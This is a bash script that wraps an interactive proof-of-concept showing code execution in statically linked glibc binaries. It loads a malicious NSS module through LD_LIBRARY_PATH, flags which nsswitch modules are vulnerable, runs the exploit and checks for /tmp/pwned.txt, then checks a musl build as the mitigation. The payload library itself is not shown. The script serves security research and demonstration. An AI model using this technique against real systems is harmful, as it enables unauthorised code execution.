#!/bin/bash
#==============================================================================
# glibc NSS Static Bypass - Interactive Demonstration Framework
#
# Description: Interactive PoC demonstrating NSS-based code execution in
#              statically linked glibc binaries via LD_LIBRARY_PATH hijacking
#==============================================================================

set -uo pipefail

#------------------------------------------------------------------------------
# Color Definitions & Formatting
#------------------------------------------------------------------------------
readonly COLOR_BLUE='\033[1;34m'
readonly COLOR_GREEN='\033[1;32m'
readonly COLOR_YELLOW='\033[1;33m'
readonly COLOR_RED='\033[1;31m'
readonly COLOR_CYAN='\033[1;36m'
readonly COLOR_BOLD='\033[1m'
readonly COLOR_RESET='\033[0m'

readonly STATUS_INFO="${COLOR_BLUE}[INFO]${COLOR_RESET}"
readonly STATUS_SUCCESS="${COLOR_GREEN}[+]${COLOR_RESET}"
readonly STATUS_WARNING="${COLOR_YELLOW}[!]${COLOR_RESET}"
readonly STATUS_ERROR="${COLOR_RED}[-]${COLOR_RESET}"
readonly STATUS_ACTION="${COLOR_CYAN}[*]${COLOR_RESET}"

PS3="$(echo -e "\n${COLOR_BLUE}[?] Select action (1-7): ${COLOR_RESET}")"

#------------------------------------------------------------------------------
# Global Environment Variables
#------------------------------------------------------------------------------
IS_MODERN_GLIBC=0
IS_MUSL_SYSTEM=0
GLIBC_VERSION="Unknown"

#------------------------------------------------------------------------------
# Utility Functions
#------------------------------------------------------------------------------
print_header() {
    local title="$1"
    echo ""
    echo -e "${COLOR_BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${COLOR_RESET}"
    echo -e "${COLOR_BOLD}${COLOR_BLUE}  $title${COLOR_RESET}"
    echo -e "${COLOR_BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${COLOR_RESET}"
    echo ""
}

print_section() {
    local title="$1"
    echo -e "${COLOR_YELLOW}→ $title${COLOR_RESET}"
}

command_exists() {
    command -v "$1" >/dev/null 2>&1
}

#------------------------------------------------------------------------------
# Environment Detection (Runs at startup)
#------------------------------------------------------------------------------
detect_environment() {
    if ! command_exists ldd; then
        return
    fi

    local ldd_out
    ldd_out=$(ldd --version 2>&1 | head -n 1)

    if echo "$ldd_out" | grep -iq "musl"; then
        IS_MUSL_SYSTEM=1
        GLIBC_VERSION="musl"
        return
    fi

    # Extract version like 2.28 or 2.43
    local ver
    ver=$(echo "$ldd_out" | grep -oE '[0-9]+\.[0-9]+')
    if [[ -n "$ver" ]]; then
        GLIBC_VERSION="$ver"
        local minor
        minor=$(echo "$ver" | cut -d. -f2)
        
        # glibc 2.34+ has builtin dns and files
        if [[ "$minor" -ge 34 ]]; then
            IS_MODERN_GLIBC=1
        fi
    fi
}

#------------------------------------------------------------------------------
# Menu Actions
#------------------------------------------------------------------------------
action_system_info() {
    print_header "SYSTEM ENVIRONMENT ANALYSIS"
    
    print_section "User Context"
    id
    echo ""
    
    print_section "Kernel Information"
    uname -a
    echo ""
    
    print_section "C Standard Library"
    if [[ "$IS_MUSL_SYSTEM" -eq 1 ]]; then
        echo -e "${STATUS_WARNING} System uses musl libc (architecturally immune)"
        echo -e "  Library: $(ldd --version 2>&1 | head -n1)"
    else
        echo -e "  glibc version: ${COLOR_BOLD}$GLIBC_VERSION${COLOR_RESET}"
        if [[ "$IS_MODERN_GLIBC" -eq 1 ]]; then
            echo -e "  Status: Modern (>= 2.34) - 'dns' and 'files' are builtin"
        else
            echo -e "  Status: Legacy (< 2.34) - 'dns' and 'files' loaded via dlopen()"
        fi
    fi
    echo ""
    
    print_section "Mitigation Toolchain (musl)"
    if command_exists musl-gcc; then
        echo -e "${STATUS_SUCCESS} musl-gcc available: $(musl-gcc --version 2>&1 | head -n1 | awk '{print $NF}')"
    else
        echo -e "${STATUS_WARNING} musl-gcc not installed"
    fi
    echo ""
    
    print_section "NSS Configuration (/etc/nsswitch.conf)"
    if [[ -f /etc/nsswitch.conf ]]; then
        local hosts_line
        hosts_line=$(grep -E "^hosts:" /etc/nsswitch.conf 2>/dev/null || echo "")
        
        if [[ -n "$hosts_line" ]]; then
            echo "  $hosts_line"
            echo ""
            echo -e "  ${COLOR_BOLD}Module Vulnerability Analysis:${COLOR_RESET}"
            
            for module in files dns myhostname mdns4_minimal resolve mymachines; do
                if echo "$hosts_line" | grep -qw "$module"; then
                    case "$module" in
                        files|dns)
                            if [[ "$IS_MODERN_GLIBC" -eq 1 ]]; then
                                echo -e "    ${COLOR_GREEN}✓${COLOR_RESET} $module — builtin (Safe on glibc >= 2.34)"
                            else
                                echo -e "    ${COLOR_RED}✗${COLOR_RESET} libnss_${module}.so.2 — loaded via dlopen() ${COLOR_RED}(VULNERABLE on glibc < 2.34)${COLOR_RESET}"
                            fi
                            ;;
                        resolve|myhostname|mdns4_minimal|mymachines)
                            echo -e "    ${COLOR_RED}✗${COLOR_RESET} libnss_${module}.so.2 — loaded via dlopen() ${COLOR_RED}(ALWAYS VULNERABLE)${COLOR_RESET}"
                            ;;
                    esac
                fi
            done
            
            if [[ "$IS_MODERN_GLIBC" -eq 0 && "$IS_MUSL_SYSTEM" -eq 0 ]]; then
                echo ""
                echo -e "  ${COLOR_YELLOW}Note for legacy glibc:${COLOR_RESET} In older versions, even 'files' is loaded dynamically."
                echo -e "  During a single DNS resolution, libnss_files.so.2 can be dlopen()'d hundreds of times!"
            fi
        else
            echo -e "${STATUS_WARNING} No 'hosts:' directive found"
        fi
    fi
    echo ""
}

action_compile() {
    print_header "BUILD PROCESS"
    echo -e "${STATUS_ACTION} Compiling all targets..."
    echo ""
    
    if make; then
        echo ""
        echo -e "${STATUS_SUCCESS} Build completed successfully"
        print_section "Build Artifacts"
        ls -lh gateway libnss_*.so* gateway_musl 2>/dev/null | awk '{print "  " $9 ": " $5}' || true
    else
        echo -e "${STATUS_ERROR} Build failed"
    fi
    echo ""
}

action_test_binary() {
    print_header "VULNERABLE BINARY ANALYSIS"
    
    if [[ ! -f "./gateway" ]]; then
        echo -e "${STATUS_ERROR} ./gateway not found - compile first"
        return 1
    fi
    
    print_section "Binary Type Verification"
    echo -e "  File type: $(file gateway | cut -d: -f2 | xargs)"
    echo -e "  Dynamic check: $(ldd gateway 2>&1 | head -n1)"
    echo ""
    
    print_section "Runtime Library Loading Analysis (strace)"
    echo -e "  Intercepting system calls during DNS resolution..."
    echo ""
    
    local trace_output
    trace_output=$(strace -e trace=open,openat ./gateway 2>&1 || true)
    
    echo -e "  ${COLOR_BOLD}External Shared Libraries Loaded:${COLOR_RESET}"
    echo "$trace_output" | grep -oE '"[^"]*libnss_[^"]*\.so[^"]*"' | tr -d '"' | sort -u | while read -r lib; do
        echo -e "    ${COLOR_RED}✗${COLOR_RESET} $lib"
    done
    
    echo "$trace_output" | grep -oE '"[^"]*libc\.so[^"]*"' | tr -d '"' | sort -u | while read -r lib; do
        echo -e "    ${COLOR_RED}✗${COLOR_RESET} $lib (Dynamic libc cascaded!)"
    done
    
    echo "$trace_output" | grep -oE '"[^"]*ld-linux[^"]*"' | tr -d '"' | sort -u | while read -r lib; do
        echo -e "    ${COLOR_RED}✗${COLOR_RESET} $lib (Dynamic linker cascaded!)"
    done
    echo ""
}

action_exploit() {
    print_header "EXPLOITATION DEMONSTRATION"
    
    if [[ ! -x "./gateway" ]]; then
        echo -e "${STATUS_ERROR} ./gateway not found or not executable"
        return 1
    fi
    
    print_section "Attack Vector Analysis"
    local nss_line
    nss_line=$(grep -E "^hosts:" /etc/nsswitch.conf 2>/dev/null | sed 's/hosts:[[:space:]]*//' || echo "")
    
    if [[ -z "$nss_line" ]]; then
        echo -e "${STATUS_ERROR} Cannot read NSS configuration"
        return 1
    fi
    
    echo -e "  Current NSS chain: ${COLOR_BOLD}$nss_line${COLOR_RESET}"
    echo ""
    echo -e "  ${COLOR_BOLD}Potential dlopen() Triggers:${COLOR_RESET}"
    
    local vector_found=0
    for module in resolve dns myhostname mdns4_minimal mymachines files; do
        if echo "$nss_line" | grep -qw "$module"; then
            # Check if this module is actually vulnerable on this glibc version
            if [[ "$module" == "files" || "$module" == "dns" ]]; then
                if [[ "$IS_MODERN_GLIBC" -eq 1 ]]; then
                    continue # Skip, it's builtin and safe
                fi
            fi
            echo -e "    ${COLOR_GREEN}✓${COLOR_RESET} libnss_${module}.so.2 — will be loaded via dlopen()"
            vector_found=1
        fi
    done
    
    if [[ $vector_found -eq 0 ]]; then
        echo -e "    ${COLOR_YELLOW}!${COLOR_RESET} No vulnerable modules detected in current configuration"
    fi
    echo ""
    
    print_section "Payload Delivery"
    echo -e "  Injecting malicious NSS module via LD_LIBRARY_PATH..."
    rm -f /tmp/pwned.txt
    
    echo -e "  ${STATUS_ACTION} Executing: LD_LIBRARY_PATH=. ./gateway"
    LD_LIBRARY_PATH=. ./gateway || true
    echo ""
    
    print_section "Exploitation Verification"
    if [[ -f /tmp/pwned.txt ]]; then
        echo -e "${STATUS_SUCCESS} ${COLOR_GREEN}EXPLOITATION SUCCESSFUL${COLOR_RESET}"
        echo -e "  ${COLOR_BOLD}Payload Output (/tmp/pwned.txt):${COLOR_RESET}"
        cat /tmp/pwned.txt | sed 's/^/    /'
    else
        echo -e "${STATUS_ERROR} ${COLOR_RED}EXPLOITATION FAILED${COLOR_RESET}"
    fi
    echo ""
}

action_mitigation() {
    print_header "MITIGATION VERIFICATION (MUSL LIBC)"
    
    if [[ ! -f "./gateway_musl" ]]; then
        echo -e "${STATUS_ERROR} ./gateway_musl not found. Ensure musl-gcc is installed and rebuild."
        return 1
    fi
    
    print_section "Hardened Binary Analysis (strace)"
    local trace_output
    trace_output=$(strace -e trace=open,openat ./gateway_musl 2>&1 || true)
    
    echo -e "  ${COLOR_BOLD}File Access During DNS Resolution:${COLOR_RESET}"
    
    # Extract only valid file paths (strings enclosed in quotes starting with /)
    echo "$trace_output" | grep -oE '"/[^"]+"' | tr -d '"' | sort -u | while read -r path; do
        if [[ "$path" == *.so* ]]; then
            echo -e "    ${COLOR_RED}✗${COLOR_RESET} $path (SHARED LIBRARY - UNEXPECTED!)"
        elif [[ "$path" == /etc/* ]]; then
            echo -e "    ${COLOR_GREEN}✓${COLOR_RESET} $path (config file)"
        fi
    done
    echo ""
    
    # Safely count shared libraries (avoids the grep -c exit code trap)
    local lib_count=0
    if echo "$trace_output" | grep -qE "\.so[\.0-9]*"; then
        lib_count=$(echo "$trace_output" | grep -cE "\.so[\.0-9]*")
    fi
    
    if [[ "$lib_count" -eq 0 ]]; then
        echo -e "${STATUS_SUCCESS} ${COLOR_GREEN}ISOLATION VERIFIED: No external shared libraries loaded.${COLOR_RESET}"
    else
        echo -e "${STATUS_WARNING} Detected $lib_count external library loads"
    fi
    echo ""
}

action_clean() {
    print_header "CLEANUP"
    echo -e "${STATUS_ACTION} Removing build artifacts and exploit traces..."
    make clean
    echo -e "${STATUS_SUCCESS} Cleanup completed"
    echo ""
}

#------------------------------------------------------------------------------
# Main Execution Flow
#------------------------------------------------------------------------------

# Detect environment before showing menu
detect_environment

clear
echo -e "${COLOR_BLUE}╔══════════════════════════════════════════════════════════════════╗${COLOR_RESET}"
echo -e "${COLOR_BLUE}║${COLOR_RESET}  ${COLOR_BOLD}glibc NSS Static Bypass — Interactive Demonstration Framework${COLOR_RESET}  ${COLOR_BLUE} ║${COLOR_RESET}"
echo -e "${COLOR_BLUE}║${COLOR_RESET}  ${COLOR_CYAN}Proof of Concept for Static Binary Code Execution via NSS${COLOR_RESET}     ${COLOR_BLUE}  ║${COLOR_RESET}"
echo -e "${COLOR_BLUE}╚══════════════════════════════════════════════════════════════════╝${COLOR_RESET}"
echo ""

options=(
    "System Environment Analysis"
    "Compile All Targets"
    "Analyze Vulnerable Binary"
    "Execute Exploit (LD_LIBRARY_PATH)"
    "Verify Mitigation (musl)"
    "Cleanup Artifacts"
    "Exit"
)

select opt in "${options[@]}"; do
    clear
    
    case $opt in
        "${options[0]}") action_system_info ;;
        "${options[1]}") action_compile ;;
        "${options[2]}") action_test_binary ;;
        "${options[3]}") action_exploit ;;
        "${options[4]}") action_mitigation ;;
        "${options[5]}") action_clean ;;
        "${options[6]}")
            echo -e "${STATUS_SUCCESS} Exiting demonstration framework"
            break
            ;;
        *)
            echo -e "${STATUS_ERROR} Invalid selection. Please choose 1-${#options[@]}"
            ;;
    esac
    
    # Display menu in formatted grid (FIXED: removed 'local' keyword)
    echo ""
    echo -e "${COLOR_BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${COLOR_RESET}"
    echo ""
    
    col_width=45
    cols=2
    
    for ((i=0; i<${#options[@]}; i++)); do
        printf "${COLOR_BOLD}%2d)${COLOR_RESET} %-${col_width}s" $((i+1)) "${options[i]}"
        if [[ $(( (i+1) % cols )) -eq 0 ]] || [[ $i -eq $((${#options[@]}-1)) ]]; then
            echo ""
        fi
    done
    echo ""
done